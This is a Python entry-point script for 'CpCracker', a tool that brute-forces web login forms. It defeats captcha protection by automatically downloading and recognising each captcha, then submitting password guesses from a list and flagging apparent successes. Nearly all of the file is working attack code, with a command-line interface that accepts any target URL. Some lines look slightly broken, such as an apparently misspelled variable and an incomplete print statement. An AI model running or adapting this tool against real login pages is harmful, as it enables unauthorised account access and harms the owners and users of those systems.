import argparse
import time

from colorama import Fore, Style

from captcha_processor import CaptchaProcessor
from config import *
from password_manager import PasswordManager
from request_handler import RequestHandler
from result_checker import ResultChecker


class Cracker:
    """
    python main.py --target-url http://10.0.0.103:5000/login --captcha-url http://10.0.0.103:5000/captcha --user Jarway --pwd password --cap captcha
    """

    def __init__(self, target_url: str, captcha_url: str, username_field: str, password_field: str,
                 captcha_field: str) -> None:
        """初始化密码破解工具"""
        self.bytes = byets
        self.captcha_processor = CaptchaProcessor()
        self.password_manager = PasswordManager()
        self.request_handler = RequestHandler()
        self.result_checker = ResultChecker(username=username_field)
        # 初始化URL和字段配置
        self.target_url = target_url
        self.captcha_url = captcha_url
        self.username_field = username_field
        self.password_field = password_field
        self.captcha_field = captcha_field
        # 解析目标URL获取基础路径
        url_parts = target_url.split('/')
        self.base_url = '/'.join(url_parts[:3])  # 获取协议+域名部分
        self.captcha_path = "./YZM/temp_captcha.jpg"
        self.login_url = target_url
        # 加载请求体
        with open(self.request_handler.post_file, 'r') as f:
            post_content = f.read()
        _, self.body_part = post_content.split('\n\n', 1)

    def run(self) -> None:
        """运行破解流程"""
        # 遍历所有密码
        for password in self.password_manager.passwords:
            try:
                # 下载验证码
                response_success = self.request_handler.download_captcha(self.captcha_url, self.captcha_path)
                if not response_success:
                    continue
                # 识别验证码
                captcha_text = self.captcha_processor.recognize_captcha(self.captcha_path)
                if not captcha_text:
                    print(
                        f"[ --- ] The verification code recognition failed. Skip the current password")
                    self.request_handler.cleanup_captcha(self.captcha_path)
                    continue
                print(
                    f"[ ... ] Trying passwd:  >>> {password} <<< , "
                    f"captcha: *** {captcha_text} *** ")
                # 发送登录请求
                response_content = self.request_handler.send_login_request(
                    self.login_url,
                    self.body_part,
                    password,
                    captcha_text
                )
                if response_content is None:
                    continue
                is_preset, username = self.result_checker.check_preset_credentials(password)
                # 检查是否登录成功
                if is_preset:
                    print(f"[ ... ] Response Length:  bytes")
                    print(
                        f"[ +++ ] Maybe Success! Username: {username},"
                        f" password: {password}")
                    continue
                # 打印响应字节长度
                content_length = len(response_content)
                print(f"[ ... ] Response Length:: {content_length} bytes")
                # 检查是否登录成功
                # if self.result_checker.is_login_successful(content_length):
                #     print(f"{Fore.GREEN}[ + ]{Style.RESET_ALL} Maybe Successfully ! Username: {username}, password: {password}")
            except Exception as e:
                print(f"[ --- ] Processing raising Error: {e}")

            finally:
                # 清理验证码图片
                self.request_handler.cleanup_captcha(self.captcha_path)
                time.sleep(0.2)  # 控制频率


def print_banner():
    print(Fore.CYAN + r"""
╔═════════════════════════════════════════════════════════════~~~~
║                                                          ═══
║      ______      ______                __                ═════~~~
║     / ____/___  / ____/________ ______/ /_____  _____    ═══~~~
║    / /   / __ \/ /   / ___/ __ `/ ___/ //_/ _ \/ ___/    ════~~~~~~~~
║   / /___/ /_/ / /___/ /  / /_/ / /__/ ,< /  __/ /        ═════~~~
║   \____/ .___/\____/_/   \__,_/\___/_/|_|\___/_/         ══════~~~
║       /_/                                                ═══════~~~~~~~~~~~
║                                                          ═════~~~~
║                                                          ════~~~~~~~
║  ➤ PROJECT: CpCracker                                   ═══~~
║  ➤ VERSION: 1.0.0                                       ════~~~~
║  ➤ AUTHOR: ** CypherGhost >> (ZooNJarway)              ════~~
║  ➤ DESCRIPTION: Brute Force for Captcha                 ════
║                                                         ═════
╚════════════════════════════════════════════════════════════~~~~~~~
""" + Style.RESET_ALL)


if __name__ == "__main__":
    print_banner()
    print(f"{Fore.YELLOW}OK! -- Launched! -- Connecting target URL...........{Style.RESET_ALL}")
    parser = argparse.ArgumentParser(description='CpCracker')
    parser.add_argument('--target-url', required=True, help='目标登录URL')
    parser.add_argument('--captcha-url', required=True, help='验证码图片URL')
    parser.add_argument('--user', required=True, help='用户名字段名称')
    parser.add_argument('--pwd', required=True, help='密码字段名称')
    parser.add_argument('--cap', required=True, help='验证码字段名称')
    args = parser.parse_args()
    login_url = args.target_url
    if not login_url.endswith('/login'):
        if login_url.endswith('/'):
            login_url += 'login'
        else:
            login_url += '/login'
    cracker = Cracker(login_url, args.captcha_url, args.user, args.pwd, args.cap)
    cracker.run()
